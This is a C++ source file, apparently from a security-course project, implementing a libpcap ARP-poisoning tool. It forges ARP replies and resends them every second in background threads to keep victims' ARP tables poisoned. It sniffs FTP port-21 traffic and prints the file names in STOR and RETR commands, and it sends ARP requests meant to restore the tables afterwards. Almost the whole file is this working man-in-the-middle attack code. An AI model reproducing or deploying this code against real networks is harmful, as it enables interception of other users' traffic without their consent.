#include <Pcap.hpp>

std::vector<struct s_thread> g_threads;
std::string g_ip_src;
std::string g_ip_target;
std::string g_mac_src;
std::string g_mac_target;
unsigned char *g_sll_addr;
unsigned char g_sll_halen;

Pcap::Pcap(const char *ip_src, const char *mac_src,
	  const char *ip_target, const char *mac_target,
	  std::string &interface) : _ip_src(ip_src), _mac_src(mac_src),
		_ip_target(ip_target), _mac_target(mac_target),
		_interface(interface) {
	this->_pcap_list = NULL;
	this->_device_capture = NULL;
	this->_fp = NULL;
	this->_network = 0;
	this->_netmask = 0;
	this->_sll_halen = 0;
	this->_sll_addr = NULL;
	memset(this->_buf, 0, sizeof(this->_buf));
}

/*
 * Clear pcap allocation
 */
Pcap::~Pcap() {
	if (this->_pcap_list)
		pcap_freealldevs(this->_pcap_list);
	if (this->_device_capture) {
		pcap_close(this->_device_capture);
	}
	if (this->_fp) {
		pcap_freecode(this->_fp);
		delete this->_fp;
	}
}

const std::string & Pcap::getInterface() const {
	return this->_interface;
}

pcap_t	* Pcap::GetDeviceCapture() const {
	return this->_device_capture;
}

struct bpf_program * Pcap::getBpf() const {
	return this->_fp;
}

void	Pcap::SetDeviceCapture(const std::string &interface) {
	char errbuf[PCAP_ERRBUF_SIZE] = {0};

	this->_device_capture = pcap_create(interface.c_str(), errbuf);
	if (!this->_device_capture)
		throw std::runtime_error(errbuf);
	if (pcap_lookupnet(interface.c_str(), &this->_network, &this->_netmask, errbuf))
		throw std::runtime_error(errbuf);
}

int	Pcap::setTimeout(pcap_t *src, int to_ms) const {
	return pcap_set_timeout(src, to_ms);
}

int	Pcap::setNonBlock(char *errbuf, int val) {
	return pcap_setnonblock(this->_device_capture, val, errbuf);
}

int	Pcap::setSelfMac() {
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	int res = pcap_findalldevs(&this->_pcap_list, errbuf);

	if (res) {
		return res;
	}
	struct sockaddr_ll *ethernet = NULL;
	struct sockaddr_in *addr = NULL;
	pcap_if_t *list_search = this->_pcap_list;
	pcap_addr *addr_list = NULL;

	while (list_search) {
		addr_list = list_search->addresses;
		if (list_search->name == this->_interface) {
			while (addr_list) {
				if (addr_list
					&& addr_list->addr
					&& addr_list->addr->sa_family == AF_PACKET) {
					ethernet = reinterpret_cast<sockaddr_ll *>(addr_list->addr);
				}
				if (addr_list
					&& addr_list->addr
					&& addr_list->addr->sa_family == AF_INET) {
					addr = reinterpret_cast<sockaddr_in *>(addr_list->addr);
				}
				if (addr && ethernet)
					break ;
				addr_list = addr_list->next;
			}
		}
		list_search = list_search->next;
		if (ethernet || addr)
			break ;
	}
	list_search = NULL;
	addr_list = NULL;
	if (ethernet) {
		this->_sll_halen = ethernet->sll_halen;
		this->_sll_addr = ethernet->sll_addr;
	}
	if (ethernet && addr) {
		this->_network = addr->sin_addr.s_addr;
		if (ethernet && addr)
			return 0;
	}
	return 1;
}


int	Pcap::activateCapture(void) const {
	return pcap_activate(this->_device_capture);
}

int	Pcap::compileFilterArp(pcap_t *src)
{
	if (!src)
		return 1;
	if (!this->_fp)
		this->_fp = new struct bpf_program;
	if (!this->_fp)
		return 1;
	memset(this->_fp, 0, sizeof(struct bpf_program));
	return pcap_compile(src, this->_fp, "arp or port 21", 0, this->_netmask);
}

int	Pcap::setFilter(pcap_t *src, struct bpf_program *fp) const {
	return pcap_setfilter(src, fp);
}


/*
 * Fill pointer address from std::string
 */
static void convAddress(const std::string &src, uint8_t *addr,
	const char c, const unsigned int len, const int base) {
	if (!addr)
		return ;
	size_t pos = 0;
	size_t old_pos = 0;
	unsigned int i = 0;

	pos = src.find(c, pos);
	while (pos != std::string::npos && i < len) {
		std::string substr = src.substr(old_pos, pos - old_pos);
		old_pos = ++pos;
		pos = src.find(c, old_pos);
		addr[i] = std::stoi(substr, NULL, base);
		i++;
	}
	std::string substr = src.substr(old_pos, pos - old_pos);
	addr[i] = std::stoi(substr, NULL, base);
}

static int forge_packet_reply(const u_char *bytes, char *buf, bool retrieve) {
	const struct ether_header *eth = reinterpret_cast<const struct ether_header *>(bytes);
	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);
	struct ether_header eth_cpy;
	struct ether_arp arp_cpy;

	memset(&eth_cpy, 0, sizeof(struct ether_header));
	memset(&arp_cpy, 0, sizeof(struct ether_arp));
	for (int i = 0; i < ETH_ALEN; i++) {
		eth_cpy.ether_dhost[i] = eth->ether_shost[i];
	}
	for (int i = 0; i < ETH_ALEN; i++) {
		eth_cpy.ether_shost[i] = eth->ether_dhost[i];
	}
	eth_cpy.ether_type = htons(0x0806);
	arp_cpy.ea_hdr.ar_hrd = htons(1);
	arp_cpy.ea_hdr.ar_pro = htons(0x0800);
	arp_cpy.ea_hdr.ar_hln = ETH_ALEN;
	arp_cpy.ea_hdr.ar_pln = 4;
	arp_cpy.ea_hdr.ar_op = htons(ARPOP_REPLY);
	if (retrieve == false) {
		for (int i = 0; i < ETH_ALEN; i++) {
			arp_cpy.arp_sha[i] = arp->arp_tha[i];
		}
	} else {
		convAddress(g_mac_target, arp_cpy.arp_sha, ':', ETH_ALEN, 16);
		g_mac_target = g_mac_src;
	}
	convAddress(g_ip_src, arp_cpy.arp_spa, '.', 4, 10);
	for (int i = 0; i < ETH_ALEN; i++) {
		arp_cpy.arp_tha[i] = arp->arp_sha[i];
	}
	for (int i = 0; i < 4; i++) {
		arp_cpy.arp_tpa[i] = arp->arp_spa[i];
	}
	//compare sender ip target ip if same then replace arp_spa par target
	int same = 0;
	for (int i = 0; i < 4; i++) {
		if (arp_cpy.arp_spa[i] == arp_cpy.arp_tpa[i]) {
			++same;
		}
	}
	if (same == 4)
		convAddress(g_ip_target, arp_cpy.arp_spa, '.', 4, 10);
	memcpy(buf, &eth_cpy, sizeof(struct ether_header));
	memcpy(buf + ETH_HLEN, &arp_cpy, sizeof(struct ether_arp));
	same = 0;
	for (int i = 0; i < ETH_ALEN && i < g_sll_halen; i++) {
		if (g_sll_addr[i] == eth->ether_dhost[i]) {
			++same;
		}
	}
	if (retrieve == true)
		return 1;
	if (retrieve == false && same == ETH_ALEN) {
		return 1;
	}
	return 0;
}

/*
 * Arp poison
 * Resend infinitely to keep arp table poisoned
 */
static int	send_packet(const char *buf, unsigned int len) {
	if (!g_device)
		return -1;
	return pcap_sendpacket(g_device,
		(const u_char *)buf, len);
}

static void start_routine(const char *buf, unsigned int len, int *stop) {
	static_cast<void>(stop);
	if (g_free_arp == 1) {
		int res = send_packet(buf, len); // if err display error

		if (res == PCAP_ERROR_ACTIVATED
			|| res == PCAP_ERROR)
			pcap_perror(g_device, "Error send packet");
		else if (res == -1)
			std::cerr << "No device found, can't reply." << std::endl;
	}
	while (!g_free_arp) {
		int res = send_packet(buf, len); // if err display error

		if (res == PCAP_ERROR_ACTIVATED
			|| res == PCAP_ERROR)
			pcap_perror(g_device, "Error send packet");
		else if (res == -1)
			std::cerr << "No device found, can't reply." << std::endl;
		sleep(1);
	}
}

static void handle_arp(const u_char *bytes, bool retrieve) {
	char buf[BUFFER_SIZE] = { 0 };
	int res = forge_packet_reply(bytes, buf, retrieve);

	if (res == 1) {
		char *cstr = new char [BUFFER_SIZE];

		memset(cstr, 0, BUFFER_SIZE);
		std::memcpy(cstr, buf, BUFFER_SIZE);
		g_threads.push_back({std::thread(start_routine,
					cstr, sizeof(buf), &g_free_arp), cstr});
	}
	std::ofstream old_cout;
	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);

	old_cout.copyfmt(std::cout);
	if (arp) {
		std::cout << "Sender hardware address: ";
		for (unsigned int i = 0; i < ETH_ALEN; i++) {
			std::cout << std::setw(2) << std::setfill('0') \
				<< std::uppercase << std::hex \
				<< static_cast<int>(arp->arp_sha[i]) << std::dec;
			if (i + 1 != ETH_ALEN)
				std::cout << ":";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		std::cout << "Sender IPv4 address: ";
		for (unsigned int i = 0; i < FT_IPV4_LEN; i++) {
			std::cout << static_cast<int>(arp->arp_spa[i]);
			if (i + 1 != 4)
				std::cout << ".";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		std::cout << "Target hardware address: ";
		for (unsigned int i = 0; i < ETH_ALEN; i++) {
			std::cout << std::setw(2) << std::setfill('0') \
				<< std::uppercase << std::hex \
			       	<< static_cast<int>(arp->arp_tha[i]) << std::dec;
			if (i + 1 != ETH_ALEN)
				std::cout << ":";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		std::cout << "Target IPv4 address: ";
		for (unsigned int i = 0; i < FT_IPV4_LEN; i++) {
			std::cout << static_cast<int>(arp->arp_tpa[i]);
			if (i + 1 != 4)
				std::cout << ".";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl << std::endl;
	}
}

/*
 * Get tcp part from packet
 * Get file's name
 * Display file's name
 * Request: STOR | RETR
 */
static void handle_ftp(const u_char *bytes){
	if (!bytes)
		return ;
	bpf_u_int32 size = ETH_HLEN;
	const struct iphdr *ip
		= reinterpret_cast<const struct iphdr *>(bytes + size);
	size += (ip->ihl * 4);
	const struct tcphdr *tcp
		= reinterpret_cast<const struct tcphdr *>(bytes + size);
	size += (tcp->doff * 4);
	const unsigned char *ftp_bytes
		= reinterpret_cast<const unsigned char *>(bytes + size);
	std::string fill_cmp((const char *)ftp_bytes);

	if (ftp_bytes) {
		if (!fill_cmp.find("STOR")
			|| !fill_cmp.find("RETR")) {
			fill_cmp.replace(0, 4, "");
			std::cout << "FTP name is:" << fill_cmp \
				<< std::endl;
		}
	}
	fill_cmp.clear();
}

/*
 * from header file
 * struct pcap_pkthdr {
 *	struct timeval ts;	* time stamp
 *	bpf_u_int32 caplen;	* length of portion present
 *	bpf_u_int32 len;	* length of this packet (off wire)
 *};
 * FTP = 0x800
 * ARP = 0x806
 */
void	handler(u_char *user, const struct pcap_pkthdr *h,
		const u_char *bytes) {
	const struct ether_header *eth = (const struct ether_header *)bytes;

	static_cast<void>(user);
	static_cast<void>(h);
	if (g_free_arp == 0) {
		if (eth && ntohs(eth->ether_type) == ETHERTYPE_ARP) {
			handle_arp(bytes, false);
		} else if (eth && ntohs(eth->ether_type) == ETHERTYPE_IP) {
			handle_ftp(bytes);
		}
	} else {
			handle_arp(bytes, true);
	}
}

int	Pcap::loopPcap(pcap_t *src) {
	if (!src)
		return -1;
	g_ip_src = this->_ip_src;
	g_ip_target = this->_ip_target;
	g_mac_src = this->_mac_src;
	g_mac_target = this->_mac_target;
	g_sll_addr = this->_sll_addr;
	g_sll_halen = this->_sll_halen;
	std::cout << "Start poisoning, waiting for packets..." << std::endl;
	int res = pcap_loop(src, INFINITE, handler, NULL);

	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
		pcap_perror(src, "Error capturing packets:");
		return res;
	}
	for (s_thread& thr : g_threads) {
		if (thr.thread.joinable() == true) {
			thr.thread.join();
			delete [] thr.cstr;
		}
	}
	g_threads.clear();
	this->forgePacketRequest(true);
	this->sendPacket();
	this->forgePacketRequestSrc(true);
	this->sendPacket();
	res = pcap_loop(src, TWO_CAPTURE, handler, NULL);
	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
		pcap_perror(src, "Error capturing packets:");
	}
	for (s_thread& thr : g_threads) {
		if (thr.thread.joinable() == true) {
			thr.thread.join();
			delete [] thr.cstr;
		}
	}
	g_threads.clear();
	return res;
}

int	Pcap::sendPacket() const {
	return pcap_sendpacket(this->_device_capture,
		(const u_char *)this->_buf, sizeof(this->_buf));
}

void Pcap::forgePacketRequestSrc(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	//broadcast
	memset(&eth.ether_dhost, 255, sizeof(eth.ether_dhost));
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		eth.ether_shost[i] = this->_sll_addr[i];
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		arp.arp_sha[i] = this->_sll_addr[i];
	}
	memcpy(&arp.arp_spa, &this->_network, sizeof(this->_network));
	if (restore) {
		convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	} else {
		convAddress(this->_ip_src, arp.arp_tpa, '.', 4, 10);
	}
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}

void Pcap::forgePacketRequest(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	//broadcast
	memset(&eth.ether_dhost, 255, sizeof(eth.ether_dhost));
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		eth.ether_shost[i] = this->_sll_addr[i];
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		arp.arp_sha[i] = this->_sll_addr[i];
	}
	memcpy(&arp.arp_spa, &this->_network, sizeof(this->_network));
	if (restore) {
		convAddress(this->_ip_src, arp.arp_tpa, '.', 4, 10);
	} else {
		convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	}
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}
